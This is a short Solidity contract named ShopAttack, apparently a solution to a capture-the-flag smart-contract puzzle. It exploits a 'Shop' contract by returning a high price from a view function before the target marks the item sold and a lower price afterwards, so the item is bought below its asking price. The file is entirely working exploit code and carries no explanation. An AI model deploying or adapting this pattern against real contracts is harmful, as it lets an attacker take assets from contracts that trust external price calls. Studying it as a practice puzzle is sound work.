// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
  function isSold() external view returns (bool);
  function buy() external;
}

contract ShopAttack {

    address targetAddress;

    constructor(address _targetAddress) {
        targetAddress = _targetAddress;
    }


    function attack() public {
        IShop(targetAddress).buy();
    }

    function price() external view returns(uint256) {
        bool result = IShop(targetAddress).isSold();
        if(result == true) {
            return 50;
        }
        else {
            return 100;
        }
    }
}